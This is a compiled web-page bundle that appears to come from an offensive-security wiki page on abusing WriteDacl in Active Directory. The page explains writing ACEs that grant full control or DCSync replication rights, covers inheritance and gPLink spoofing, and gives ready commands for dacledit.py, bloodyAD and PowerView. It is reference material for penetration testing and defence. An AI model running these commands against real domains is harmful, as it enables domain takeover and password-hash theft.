import{_ as r,c as k,a5 as o,G as e,w as a,j as i,a as s,B as h,o as d}from"./chunks/framework.B5CpDqM0.js";const u=JSON.parse('{"title":"Grant rights","description":"","frontmatter":{"authors":"CravateRouge, KenjiEndo15, ShutdownRepo"},"headers":[],"relativePath":"ad/movement/dacl/grant-rights.md","filePath":"ad/movement/dacl/grant-rights.md","lastUpdated":1724982529000}'),p={name:"ad/movement/dacl/grant-rights.md"};function c(g,t,F,y,C,E){const l=h("PluginTabsTab"),n=h("PluginTabs");return d(),k("div",null,[t[2]||(t[2]=o('<h1 id="grant-rights" tabindex="-1">Grant rights <a class="header-anchor" href="#grant-rights" aria-label="Permalink to &quot;Grant rights&quot;">​</a></h1><p>This abuse can be carried out when controlling an object that has <code>WriteDacl</code> over another object.</p><p>The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.</p><p>Instead of giving full control, the same process can be applied to allow an object to <a href="./../credentials/dumping/dcsync">DCSync</a> by adding two ACEs with specific Extended Rights (<code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>). Giving full control leads to the same thing since <code>GenericAll</code> includes all <code>ExtendedRights</code>, hence the two extended rights needed for DCSync to work.</p><p>Story time, Exchange Servers used to have <code>WriteDacl</code> over domain objects, allowing attackers to conduct a <a href="./../exchange-services/privexchange">PrivExchange</a> attack where control would be gained over an Exchange Server which would then be used to grant an attacker-controlled object DCSync privileges to the domain.</p><div class="tip custom-block"><p class="custom-block-title">ACE inheritance</p><p></p><p>If attacker can write an ACE (<code>WriteDacl</code>) for a container or organisational unit (OU), if inheritance flags are added (<code>0x01+ 0x02</code>) to the ACE, and inheritance is enabled for an object in that container/OU, the ACE will be applied to it. By default, all the objects with <code>AdminCount=0</code> will inherit ACEs from their parent container/OU.</p><p>Impacket&#39;s dacledit (Python) can be used with the <code>-inheritance</code> flag for that purpose (<a href="https://github.com/fortra/impacket/pull/1291" target="_blank" rel="noreferrer">PR#1291</a>).</p></div><div class="tip custom-block"><p class="custom-block-title">adminCount=1 (gPLink spoofing)</p><p></p><p>In April 2024, <a href="https://www.synacktiv.com/en/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory" target="_blank" rel="noreferrer">Synacktiv explained</a> that if <code>GenericAll</code>, <code>GenericWrite</code> or <code>Manage Group Policy Links</code> privileges are available against an Organisational Unit (OU), then it&#39;s possible to compromise its child users and computers with <code>adminCount=1</code> through &quot;gPLink spoofing&quot;.</p><p>This can be performed with <a href="https://github.com/synacktiv/OUned" target="_blank" rel="noreferrer">OUned.py</a>.</p></div>',7)),e(n,null,{default:a(()=>[e(l,{label:"UNIX-like"},{default:a(()=>t[0]||(t[0]=[i("p",null,[s("From UNIX-like systems, this can be done with "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s dacledit.py (Python).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give full control")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dacledit.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'write'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -rights"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'FullControl'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -principal"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlled_object'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'target_object'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dacledit.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'write'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -rights"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DCSync'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -principal"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlled_object'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'target_object'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[s("For a DCSync granting attack, instead of using dacledit, "),i("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx"),s(" has the ability to operate that abuse with the "),i("code",null,"--escalate-user"),s(" option (see "),i("a",{href:"https://medium.com/@arkanoidctf/hackthebox-writeup-forest-4db0de793f96",target:"_blank",rel:"noreferrer"},"this"),s(").")],-1),i("p",null,[s("To enable inheritance, the "),i("code",null,"-inheritance"),s(" switch can be added to the command. Then it is possible to find interesting targets with "),i("code",null,"AdminCount=0"),s("in BloodHound for example, by looking at the object attributs.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give full control on the Users container with inheritance to the child object")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dacledit.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'write'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -rights"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'FullControl'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -principal"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlled_object'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target-dn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'CN=Users,DC=domain,DC=local'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -inheritance"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[s("Alternatively, it can be achieved using "),i("a",{href:"https://github.com/CravateRouge/bloodyAD",target:"_blank",rel:"noreferrer"},"bloodyAD")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give full control (with inheritance to the child object if applicable)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," add"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," genericAll"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TargetObject"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ControlledPrincipal"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," add"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dcsync"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ControlledPrincipal"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1)])),_:1}),e(l,{label:"Windows"},{default:a(()=>t[1]||(t[1]=[i("p",null,[s("From a Windows system, this can be achieved with "),i("a",{href:"https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/",target:"_blank",rel:"noreferrer"},"Add-DomainObjectAcl"),s(" ("),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),s(" module).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give full control")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Add-DomainObjectAcl"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Rights"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'All'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -TargetIdentity"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "target_object"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -PrincipalIdentity"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "controlled_object"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Add-DomainObjectAcl"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Rights"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'All'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -TargetIdentity"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "target_object"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -PrincipalIdentity"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "controlled_object"')])])])],-1),i("div",{class:"tip custom-block"},[i("p",null,[s("A few tests showed the "),i("code",null,"Add-DomainObjectAcl"),s(" command needed to be run with the "),i("code",null,"-Credential"),s(" and "),i("code",null,"-Domain"),s(" options in order to work")])],-1)])),_:1})]),_:1}),t[3]||(t[3]=i("h2",{id:"resources",tabindex:"-1"},[s("Resources "),i("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),t[4]||(t[4]=i("p",null,[i("a",{href:"http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/",target:"_blank",rel:"noreferrer"},"http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/")],-1)),t[5]||(t[5]=i("p",null,[i("a",{href:"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync",target:"_blank",rel:"noreferrer"},"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync")],-1))])}const m=r(p,[["render",c]]);export{u as __pageData,m as default};
